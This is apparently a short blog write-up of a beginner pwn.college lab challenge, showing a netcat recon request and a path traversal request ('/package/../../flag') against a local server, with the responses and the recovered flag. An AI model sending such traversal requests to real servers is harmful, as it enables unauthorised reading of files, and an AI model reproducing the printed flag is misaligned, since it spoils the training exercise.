---
layout: page
title: "🕵️‍♂️ Challenge: Path Traversal 1"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


**Category**: Web Security  
**Platform**: pwn.college  
**Level**: Beginner  
**Vulnerability**: Path Traversal  
**Goal**: Read the `flag` file by bypassing path restrictions.

---

## 🧩 Description

We are given a web challenge running locally on port 80. The `/package` endpoint is accessible. Our goal is to read the `flag` file, presumably located outside the `/package` directory.

---

## 🔎 Recon

Let’s start by sending a simple GET request to `/package` to understand the structure.

```bash
printf "GET /package HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```

**Response:**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Sun, 20 Jul 2025 03:49:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: close

Welcome to Web Security!
```

The server responds positively, meaning it's up and running. No sensitive data yet.

---

## 🚪 Exploiting Path Traversal

We suspect a **path traversal** vulnerability, so we try escaping the `/package` directory by adding `../` sequences to access files outside.

Try accessing `../../flag`:

```bash
printf "GET /package/../../flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```

**Response:**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Sun, 20 Jul 2025 03:50:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 60
Connection: close

pwn.college{UosMRPRfp9lbdsK84mhqTH7DQEO.QX3gzMzwSM0IzMyEzW}
```

🎉 We successfully accessed the `flag` file via path traversal.

---

## 🏁 Flag

```
pwn.college{UosMRPRfp9lbdsK84mhqTH7DQEO.QX3gzMzwSM0IzMyEzW}
```

---

